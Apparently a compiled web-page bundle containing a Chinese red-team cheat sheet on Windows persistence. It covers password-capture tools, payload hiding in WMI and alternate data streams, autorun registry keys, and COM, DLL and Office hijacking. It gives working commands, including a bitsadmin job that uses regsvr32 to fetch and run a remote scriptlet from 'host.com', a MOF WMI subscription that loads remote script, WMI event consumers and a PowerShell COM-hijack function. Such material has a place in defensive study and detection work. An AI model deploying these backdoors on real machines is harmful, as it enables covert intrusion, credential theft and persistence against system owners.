import{_ as r,r as a,o,c as d,a as e,b as i,e as s,d as t}from"./app.a667bd71.js";const l={},c=s(`<h5 id="_1\u3001\u5BC6\u7801\u8BB0\u5F55\u5DE5\u5177" tabindex="-1"><a class="header-anchor" href="#_1\u3001\u5BC6\u7801\u8BB0\u5F55\u5DE5\u5177" aria-hidden="true">#</a> 1\u3001\u5BC6\u7801\u8BB0\u5F55\u5DE5\u5177</h5><p>WinlogonHack WinlogonHack \u662F\u4E00\u6B3E\u7528\u6765\u52AB\u53D6\u8FDC\u7A0B3389\u767B\u5F55\u5BC6\u7801\u7684\u5DE5\u5177\uFF0C\u5728 WinlogonHack \u4E4B\u524D\u6709 \u4E00\u4E2A Gina \u6728\u9A6C\u4E3B\u8981\u7528\u6765\u622A\u53D6 Windows 2000\u4E0B\u7684\u5BC6\u7801\uFF0CWinlogonHack \u4E3B\u8981\u7528\u4E8E\u622A \u53D6 Windows XP \u4EE5\u53CA Windows 2003 Server\u3002 \u952E\u76D8\u8BB0\u5F55\u5668 \u5B89\u88C5\u952E\u76D8\u8BB0\u5F55\u7684\u76EE\u5730\u4E0D\u5149\u662F\u8BB0\u5F55\u672C\u673A\u5BC6\u7801\uFF0C\u662F\u8BB0\u5F55\u7BA1\u7406\u5458\u4E00\u5207\u7684\u5BC6\u7801\uFF0C\u6BD4\u5982\u8BF4\u4FE1\u7BB1\uFF0CWEB \u7F51\u9875\u5BC6\u7801\u7B49\u7B49\uFF0C\u8FD9\u6837\u4E5F\u53EF\u4EE5\u5F97\u5230\u7BA1\u7406\u5458\u7684\u5F88\u591A\u4FE1\u606F\u3002 NTPass \u83B7\u53D6\u7BA1\u7406\u5458\u53E3\u4EE4,\u4E00\u822C\u7528 gina \u65B9\u5F0F\u6765,\u4F46\u6709\u4E9B\u673A\u5668\u4E0A\u5B89\u88C5\u4E86 pcanywhere \u7B49\u8F6F\u4EF6\uFF0C\u4F1A\u5BFC\u81F4\u8FDC\u7A0B\u767B\u5F55\u7684\u65F6\u5019\u51FA\u73B0\u6545\u969C\uFF0C\u672C\u8F6F\u4EF6\u53EF\u5B9E\u73B0\u65E0\u969C\u788D\u622A\u53D6\u53E3\u4EE4\u3002 Linux \u4E0B openssh \u540E\u95E8 \u91CD\u65B0\u7F16\u8BD1\u8FD0\u884C\u7684sshd\u670D\u52A1\uFF0C\u7528\u4E8E\u8BB0\u5F55\u7528\u6237\u7684\u767B\u9646\u5BC6\u7801\u3002</p><h5 id="_2\u3001\u5E38\u7528\u7684\u5B58\u50A8payload\u4F4D\u7F6E" tabindex="-1"><a class="header-anchor" href="#_2\u3001\u5E38\u7528\u7684\u5B58\u50A8payload\u4F4D\u7F6E" aria-hidden="true">#</a> 2\u3001\u5E38\u7528\u7684\u5B58\u50A8Payload\u4F4D\u7F6E</h5><p><strong>WMI</strong> : \u5B58\u50A8\uFF1A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$StaticClass = New-Object Management.ManagementClass(&#39;root\\cimv2&#39;, $null,$null)
$StaticClass.Name = &#39;Win32_Command&#39;
$StaticClass.Put()
$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)
$StaticClass.Put() 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u8BFB\u53D6:</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$Payload=([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>\u5305\u542B\u6570\u5B57\u7B7E\u540D\u7684PE\u6587\u4EF6</strong> \u5229\u7528\u6587\u4EF6hash\u7684\u7B97\u6CD5\u7F3A\u9677\uFF0C\u5411PE\u6587\u4EF6\u4E2D\u9690\u85CFPayload\uFF0C\u540C\u65F6\u4E0D\u5F71\u54CD\u8BE5PE\u6587\u4EF6\u7684\u6570\u5B57\u7B7E\u540D <strong>\u7279\u6B8AADS</strong> \u2026</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>type putty.exe &gt; ...:putty.exe
wmic process call create c:\\test\\ads\\...:putty.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>\u7279\u6B8ACOM\u6587\u4EF6</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>type putty.exe &gt; \\\\.\\C:\\test\\ads\\COM1:putty.exe
wmic process call create \\\\.\\C:\\test\\ads\\COM1:putty.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>\u78C1\u76D8\u6839\u76EE\u5F55</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>type putty.exe &gt;C:\\:putty.exe 
wmic process call create C:\\:putty.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="_3\u3001run-runonce-keys" tabindex="-1"><a class="header-anchor" href="#_3\u3001run-runonce-keys" aria-hidden="true">#</a> 3\u3001Run/RunOnce Keys</h5><p>\u7528\u6237\u7EA7</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>\u7BA1\u7406\u5458</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="_4\u3001bootexecute-key" tabindex="-1"><a class="header-anchor" href="#_4\u3001bootexecute-key" aria-hidden="true">#</a> 4\u3001BootExecute Key</h5><p>\u7531\u4E8Esmss.exe\u5728Windows\u5B50\u7CFB\u7EDF\u52A0\u8F7D\u4E4B\u524D\u542F\u52A8\uFF0C\u56E0\u6B64\u4F1A\u8C03\u7528\u914D\u7F6E\u5B50\u7CFB\u7EDF\u6765\u52A0\u8F7D\u5F53\u524D\u7684\u914D\u7F6E\u5355\u5143\uFF0C\u5177\u4F53\u6CE8\u518C\u8868\u952E\u503C\u4E3A\uFF1A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\hivelist
HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Session Manager
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="_5\u3001userinit-key" tabindex="-1"><a class="header-anchor" href="#_5\u3001userinit-key" aria-hidden="true">#</a> 5\u3001Userinit Key</h5><p>WinLogon\u8FDB\u7A0B\u52A0\u8F7D\u7684login scripts,\u5177\u4F53\u952E\u503C\uFF1A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h5 id="_6\u3001startup-keys" tabindex="-1"><a class="header-anchor" href="#_6\u3001startup-keys" aria-hidden="true">#</a> 6\u3001Startup Keys</h5><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="_7\u3001services" tabindex="-1"><a class="header-anchor" href="#_7\u3001services" aria-hidden="true">#</a> 7\u3001Services</h5><p>\u521B\u5EFA\u670D\u52A1</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>sc create [ServerName] binPath= BinaryPathName
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h5 id="_8\u3001browser-helper-objects" tabindex="-1"><a class="header-anchor" href="#_8\u3001browser-helper-objects" aria-hidden="true">#</a> 8\u3001Browser Helper Objects</h5><p>\u672C\u8D28\u4E0A\u662FInternet Explorer\u542F\u52A8\u65F6\u52A0\u8F7D\u7684DLL\u6A21\u5757</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h5 id="_9\u3001appinit-dlls" tabindex="-1"><a class="header-anchor" href="#_9\u3001appinit-dlls" aria-hidden="true">#</a> 9\u3001AppInit_DLLs</h5><p>\u52A0\u8F7DUser32.dll\u4F1A\u52A0\u8F7D\u7684DLL</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h5 id="_10\u3001\u6587\u4EF6\u5173\u8054" tabindex="-1"><a class="header-anchor" href="#_10\u3001\u6587\u4EF6\u5173\u8054" aria-hidden="true">#</a> 10\u3001\u6587\u4EF6\u5173\u8054</h5><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKEY_LOCAL_MACHINE\\Software\\Classes
HKEY_CLASSES_ROOT
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,37),u={id:"_11\u3001bitsadmin",tabindex:"-1"},h=e("a",{class:"header-anchor",href:"#_11\u3001bitsadmin","aria-hidden":"true"},"#",-1),_=t(" 11\u3001"),m={href:"http://www.liuhaihua.cn/archives/357579.html",target:"_blank",rel:"noopener noreferrer"},v=t("bitsadmin"),b=s(`<div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>bitsadmin /create backdoor
bitsadmin /addfile backdoor %comspec% %temp%\\cmd.exe
bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot;
bitsadmin /Resume backdoor
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),p={id:"_12\u3001mof",tabindex:"-1"},g=e("a",{class:"header-anchor",href:"#_12\u3001mof","aria-hidden":"true"},"#",-1),E=t(" 12\u3001"),x={href:"https://evi1cg.me/archives/Powershell_MOF_Backdoor.html",target:"_blank",rel:"noopener noreferrer"},f=t("mof "),C=s(`<div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) 
instance of __EventFilter as $EventFilter
{
EventNamespace = &quot;Root\\\\Cimv2&quot;;
Name = &quot;filtP1&quot;;
Query = &quot;Select * From __InstanceModificationEvent &quot;
&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;
&quot;And TargetInstance.Second = 1&quot;;
QueryLanguage = &quot;WQL&quot;;
}; 
instance of ActiveScriptEventConsumer as $Consumer
{
Name = &quot;consP1&quot;;
ScriptingEngine = &quot;JScript&quot;;
ScriptText = &quot;GetObject(\\&quot;script:https://host.com/test\\&quot;)&quot;;
}; 
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u7BA1\u7406\u5458\u6267\u884C\uFF1A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>mofcomp test.mof
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,3),A={id:"_13\u3001wmi",tabindex:"-1"},S=e("a",{class:"header-anchor",href:"#_13\u3001wmi","aria-hidden":"true"},"#",-1),w=t(" 13\u3001"),L={href:"https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/",target:"_blank",rel:"noopener noreferrer"},k=t("wmi"),B=s(`<p>\u6BCF\u969460\u79D2\u6267\u884C\u4E00\u6B21notepad.exe</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;
wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\\Windows\\System32\\notepad.exe&quot;,CommandLineTemplate=&quot;C:\\Windows\\System32\\notepad.exe&quot;
wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\\&quot;BotFilter82\\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\\&quot;BotConsumer23\\&quot;&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),q={id:"_14\u3001userland-persistence-with-scheduled-tasks",tabindex:"-1"},y=e("a",{class:"header-anchor",href:"#_14\u3001userland-persistence-with-scheduled-tasks","aria-hidden":"true"},"#",-1),P=t(" 14\u3001"),O={href:"https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/",target:"_blank",rel:"noopener noreferrer"},W=t("Userland Persistence With Scheduled Tasks"),N=s(`<p>\u52AB\u6301\u8BA1\u5212\u4EFB\u52A1UserTask\uFF0C\u5728\u7CFB\u7EDF\u542F\u52A8\u65F6\u52A0\u8F7Ddll</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>function Invoke-ScheduledTaskComHandlerUserTask
{
[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#39;Medium&#39;)]
Param (
[Parameter(Mandatory = $True)]
[ValidateNotNullOrEmpty()]
[String]
$Command,

[Switch]
$Force
)
$ScheduledTaskCommandPath = &quot;HKCU:\\Software\\Classes\\CLSID\\{58fb76b9-ac85-4e55-ac04-427593b1d060}\\InprocServer32&quot;
if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null)){
New-Item $ScheduledTaskCommandPath -Force |
New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null
}else{
Write-Verbose &quot;Key already exists, consider using -Force&quot;
exit
}

if (Test-Path $ScheduledTaskCommandPath) {
Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;
}else{
Write-Warning &quot;Failed to create registry key, exiting&quot;
exit
} 
}
Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\\test\\testmsg.dll&quot; -Verbose
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),M={id:"_15\u3001netsh",tabindex:"-1"},T=e("a",{class:"header-anchor",href:"#_15\u3001netsh","aria-hidden":"true"},"#",-1),F=t(" 15\u3001"),H={href:"https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/",target:"_blank",rel:"noopener noreferrer"},I=t("Netsh"),R=e("div",{class:"language-text ext-text line-numbers-mode"},[e("pre",{class:"language-text"},[e("code",null,`netsh add helper c:\\test\\netshtest.dll
`)]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"})])],-1),D=e("p",null,"\u540E\u95E8\u89E6\u53D1\uFF1A\u6BCF\u6B21\u8C03\u7528netsh",-1),U=e("blockquote",null,[e("p",null,"dll\u7F16\u5199:https://github.com/outflanknl/NetshHelperBeacon")],-1),V={id:"_16\u3001shim",tabindex:"-1"},j=e("a",{class:"header-anchor",href:"#_16\u3001shim","aria-hidden":"true"},"#",-1),K=t(" 16\u3001"),$={href:"https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/",target:"_blank",rel:"noopener noreferrer"},Y=t("Shim"),Q=e("p",null,"\u5E38\u7528\u65B9\u5F0F\uFF1A InjectDll RedirectShortcut RedirectEXE",-1),X={id:"_17\u3001dll\u52AB\u6301",tabindex:"-1"},G=e("a",{class:"header-anchor",href:"#_17\u3001dll\u52AB\u6301","aria-hidden":"true"},"#",-1),J=t(" 17\u3001"),z={href:"https://3gstudent.github.io/3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/",target:"_blank",rel:"noopener noreferrer"},Z=t("DLL\u52AB\u6301"),ee=e("p",null,"\u901A\u8FC7Rattler\u81EA\u52A8\u679A\u4E3E\u8FDB\u7A0B\uFF0C\u68C0\u6D4B\u662F\u5426\u5B58\u5728\u53EF\u7528dll\u52AB\u6301\u5229\u7528\u7684\u8FDB\u7A0B \u4F7F\u7528\uFF1AProcmon\u534A\u81EA\u52A8\u6D4B\u8BD5\u66F4\u7CBE\u51C6\uFF0C\u5E38\u89C4\u751F\u6210\u7684dll\u4F1A\u5BFC\u81F4\u7A0B\u5E8F\u6267\u884C\u62A5\u9519\u6216\u4E2D\u65AD\uFF0C\u4F7F\u7528AheadLib\u914D\u5408\u751F\u6210dll\u52AB\u6301\u5229\u7528\u6E90\u7801\u4E0D\u4F1A\u5F71\u54CD\u7A0B\u5E8F\u6267\u884C \u5DE5\u5177\uFF1Ahttps://github.com/sensepost/rattler \u5DE5\u5177\uFF1Ahttps://github.com/Yonsm/AheadLib",-1),te={id:"_18\u3001doubleagent",tabindex:"-1"},ne=e("a",{class:"header-anchor",href:"#_18\u3001doubleagent","aria-hidden":"true"},"#",-1),ie=t(" 18\u3001"),se={href:"https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)/",target:"_blank",rel:"noopener noreferrer"},re=t("DoubleAgent "),ae=e("p",null,"\u7F16\u5199\u81EA\u5B9A\u4E49Verifier provider DLL \u901A\u8FC7Application Verifier\u8FDB\u884C\u5B89\u88C5 \u6CE8\u5165\u5230\u76EE\u6807\u8FDB\u7A0B\u6267\u884Cpayload \u6BCF\u5F53\u76EE\u6807\u8FDB\u7A0B\u542F\u52A8\uFF0C\u5747\u4F1A\u6267\u884Cpayload\uFF0C\u76F8\u5F53\u4E8E\u4E00\u4E2A\u81EA\u542F\u52A8\u7684\u65B9\u5F0F POC : https://github.com/Cybellum/DoubleAgent",-1),oe={id:"_19\u3001waitfor-exe",tabindex:"-1"},de=e("a",{class:"header-anchor",href:"#_19\u3001waitfor-exe","aria-hidden":"true"},"#",-1),le=t(" 19\u3001"),ce={href:"https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/",target:"_blank",rel:"noopener noreferrer"},ue=t("waitfor.exe "),he=e("p",null,"\u4E0D\u652F\u6301\u81EA\u542F\u52A8\uFF0C\u4F46\u53EF\u8FDC\u7A0B\u4E3B\u52A8\u6FC0\u6D3B\uFF0C\u540E\u53F0\u8FDB\u7A0B\u663E\u793A\u4E3Awaitfor.exe POC : https://github.com/3gstudent/Waitfor-Persistence",-1),_e={id:"_20\u3001appdomainmanager",tabindex:"-1"},me=e("a",{class:"header-anchor",href:"#_20\u3001appdomainmanager","aria-hidden":"true"},"#",-1),ve=t(" 20\u3001"),be={href:"https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/",target:"_blank",rel:"noopener noreferrer"},pe=t("AppDomainManager"),ge=e("p",null,"\u9488\u5BF9.Net\u7A0B\u5E8F\uFF0C\u901A\u8FC7\u4FEE\u6539AppDomainManager\u80FD\u591F\u52AB\u6301.Net\u7A0B\u5E8F\u7684\u542F\u52A8\u8FC7\u7A0B\u3002\u5982\u679C\u52AB\u6301\u4E86\u7CFB\u7EDF\u5E38\u89C1.Net\u7A0B\u5E8F\u5982powershell.exe\u7684\u542F\u52A8\u8FC7\u7A0B\uFF0C\u5411\u5176\u6DFB\u52A0payload\uFF0C\u5C31\u80FD\u5B9E\u73B0\u4E00\u79CD\u88AB\u52A8\u7684\u540E\u95E8\u89E6\u53D1\u673A\u5236",-1),Ee=e("h5",{id:"_21\u3001office",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#_21\u3001office","aria-hidden":"true"},"#"),t(" 21\u3001Office")],-1),xe={href:"https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/",target:"_blank",rel:"noopener noreferrer"},fe=t("\u52AB\u6301Office\u8F6F\u4EF6\u7684\u7279\u5B9A\u529F\u80FD"),Ce=t(":\u901A\u8FC7dll\u52AB\u6301,\u5728Office\u8F6F\u4EF6\u6267\u884C\u7279\u5B9A\u529F\u80FD\u65F6\u89E6\u53D1\u540E\u95E8 "),Ae={href:"https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8/",target:"_blank",rel:"noopener noreferrer"},Se=t("\u5229\u7528VSTO\u5B9E\u73B0\u7684office\u540E\u95E8"),we={href:"https://github.com/3gstudent/Office-Persistence",target:"_blank",rel:"noopener noreferrer"},Le=t("Office\u52A0\u8F7D\u9879"),ke=e("ul",null,[e("li",null,"Word WLL"),e("li",null,"Excel XLL"),e("li",null,"Excel VBA add-ins"),e("li",null,"PowerPoint VBA add-ins")],-1),Be=e("blockquote",null,[e("p",null,"\u53C2\u80031 \uFF1Ahttps://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/ \u53C2\u80032 \uFF1Ahttps://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/")],-1),qe={id:"_22\u3001clr",tabindex:"-1"},ye=e("a",{class:"header-anchor",href:"#_22\u3001clr","aria-hidden":"true"},"#",-1),Pe=t(" 22\u3001"),Oe={href:"https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/",target:"_blank",rel:"noopener noreferrer"},We=t("CLR"),Ne=e("p",null,"\u65E0\u9700\u7BA1\u7406\u5458\u6743\u9650\u7684\u540E\u95E8\uFF0C\u5E76\u80FD\u591F\u52AB\u6301\u6240\u6709.Net\u7A0B\u5E8F POC:https://github.com/3gstudent/CLR-Injection",-1),Me={id:"_23\u3001msdtc",tabindex:"-1"},Te=e("a",{class:"header-anchor",href:"#_23\u3001msdtc","aria-hidden":"true"},"#",-1),Fe=t(" 23\u3001"),He={href:"https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/",target:"_blank",rel:"noopener noreferrer"},Ie=t("msdtc"),Re=e("p",null,"\u5229\u7528MSDTC\u670D\u52A1\u52A0\u8F7Ddll\uFF0C\u5B9E\u73B0\u81EA\u542F\u52A8\uFF0C\u5E76\u7ED5\u8FC7Autoruns\u5BF9\u542F\u52A8\u9879\u7684\u68C0\u6D4B \u5229\u7528\uFF1A\u5411 %windir%\\system32\\\u76EE\u5F55\u6DFB\u52A0dll\u5E76\u91CD\u547D\u540D\u4E3Aoci.dll",-1),De={id:"_24\u3001hijack-caccpropservicesclass-and-mmdeviceenumerato",tabindex:"-1"},Ue=e("a",{class:"header-anchor",href:"#_24\u3001hijack-caccpropservicesclass-and-mmdeviceenumerato","aria-hidden":"true"},"#",-1),Ve=t(" 24\u3001"),je={href:"https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/",target:"_blank",rel:"noopener noreferrer"},Ke=t("Hijack CAccPropServicesClass and MMDeviceEnumerato"),$e=e("p",null,"\u5229\u7528COM\u7EC4\u4EF6\uFF0C\u4E0D\u9700\u8981\u91CD\u542F\u7CFB\u7EDF\uFF0C\u4E0D\u9700\u8981\u7BA1\u7406\u5458\u6743\u9650 \u901A\u8FC7\u4FEE\u6539\u6CE8\u518C\u8868\u5B9E\u73B0 POC\uFF1Ahttps://github.com/3gstudent/COM-Object-hijacking",-1),Ye={id:"_25\u3001hijack-explorer-exe",tabindex:"-1"},Qe=e("a",{class:"header-anchor",href:"#_25\u3001hijack-explorer-exe","aria-hidden":"true"},"#",-1),Xe=t(" 25\u3001"),Ge={href:"https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/",target:"_blank",rel:"noopener noreferrer"},Je=t("Hijack explorer.exe"),ze=s(`<p>COM\u7EC4\u4EF6\u52AB\u6301\uFF0C\u4E0D\u9700\u8981\u91CD\u542F\u7CFB\u7EDF\uFF0C\u4E0D\u9700\u8981\u7BA1\u7406\u5458\u6743\u9650 \u901A\u8FC7\u4FEE\u6539\u6CE8\u518C\u8868\u5B9E\u73B0</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>HKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}
HKCU\\Software\\Classes\\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9}
HKCU\\Software\\Classes\\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
HKCU\\Software\\Classes\\Wow6432Node\\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="_26\u3001windows-fax-dll-injection" tabindex="-1"><a class="header-anchor" href="#_26\u3001windows-fax-dll-injection" aria-hidden="true">#</a> 26\u3001Windows FAX DLL Injection</h5><p>\u901A\u8FC7DLL\u52AB\u6301\uFF0C\u52AB\u6301Explorer.exe\u5BF9<code>fxsst.dll</code>\u7684\u52A0\u8F7D Explorer.exe\u5728\u542F\u52A8\u65F6\u4F1A\u52A0\u8F7D<code>c:\\Windows\\System32\\fxsst.dll</code>(\u670D\u52A1\u9ED8\u8BA4\u5F00\u542F\uFF0C\u7528\u4E8E\u4F20\u771F\u670D\u52A1)\u5C06payload.dll\u4FDD\u5B58\u5728<code>c:\\Windows\\fxsst.dll</code>\uFF0C\u80FD\u591F\u5B9E\u73B0dll\u52AB\u6301\uFF0C\u52AB\u6301Explorer.exe\u5BF9<code>fxsst.dll</code>\u7684\u52A0\u8F7D</p><h5 id="_27\u3001\u7279\u6B8A\u6CE8\u518C\u8868\u952E\u503C" tabindex="-1"><a class="header-anchor" href="#_27\u3001\u7279\u6B8A\u6CE8\u518C\u8868\u952E\u503C" aria-hidden="true">#</a> 27\u3001\u7279\u6B8A\u6CE8\u518C\u8868\u952E\u503C</h5>`,5),Ze=t("\u5728\u6CE8\u518C\u8868\u542F\u52A8\u9879\u521B\u5EFA\u7279\u6B8A\u540D\u79F0\u7684\u6CE8\u518C\u8868\u952E\u503C\uFF0C\u7528\u6237\u6B63\u5E38\u60C5\u51B5\u4E0B\u65E0\u6CD5\u8BFB\u53D6(\u4F7F\u7528Win32 API)\uFF0C\u4F46\u7CFB\u7EDF\u80FD\u591F\u6267\u884C(\u4F7F\u7528Native API)\u3002 "),et={href:"https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/",target:"_blank",rel:"noopener 